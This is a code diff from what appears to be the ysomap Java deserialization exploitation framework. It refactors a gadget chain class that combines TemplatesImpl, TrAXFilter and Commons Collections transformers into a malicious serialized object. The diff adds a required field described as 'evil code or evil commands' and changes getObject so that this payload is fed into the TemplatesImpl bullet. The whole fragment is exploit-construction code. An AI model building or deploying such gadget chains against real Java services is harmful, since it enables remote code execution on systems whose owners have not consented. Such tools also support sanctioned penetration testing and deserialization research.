@@ -3,6 +3,7 @@ package ysomap.gadget.bullet.collections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
 import ysomap.annotation.Authors;
 import ysomap.annotation.Dependencies;
+import ysomap.annotation.Require;
 import ysomap.gadget.ObjectGadget;
 import ysomap.gadget.bullet.TemplatesImplBullet;
 import ysomap.util.Reflections;
@@ -16,17 +17,15 @@ import java.util.LinkedList;
  * @since 2020/2/17
  */
 @SuppressWarnings({"rawtypes"})
-@Dependencies({"--args command --version"})
+@Dependencies({"jdk.xml.enableTemplatesImplDeserialization=true"})
 @Authors({ Authors.WH1T3P1G })
 public class TransformerWithTemplatesImplBullet extends TransformerBullet {
 
-    ObjectGadget tplBullet;
-    Class instantiateTransformer;
+    public ObjectGadget tplBullet;
+    public Class instantiateTransformer;
 
-    public TransformerWithTemplatesImplBullet(String args, String version) {
-        super(args, version);
-        this.tplBullet = new TemplatesImplBullet(args);
-    }
+    @Require(name = "args" ,detail = "evil code (start with 'code:') or evil commands")
+    public String args;
 
     @Override
     public void initClazz() throws ClassNotFoundException {
@@ -40,6 +39,9 @@ public class TransformerWithTemplatesImplBullet extends TransformerBullet {
 
     @Override
     public Object getObject() throws Exception {
+        initClazz();
+        tplBullet = new TemplatesImplBullet();
+        tplBullet.set("body", args);
         Object obj = tplBullet.getObject();
         LinkedList<Object> transformers = new LinkedList<>();
         transformers.add(createConstantTransformer(TrAXFilter.class));
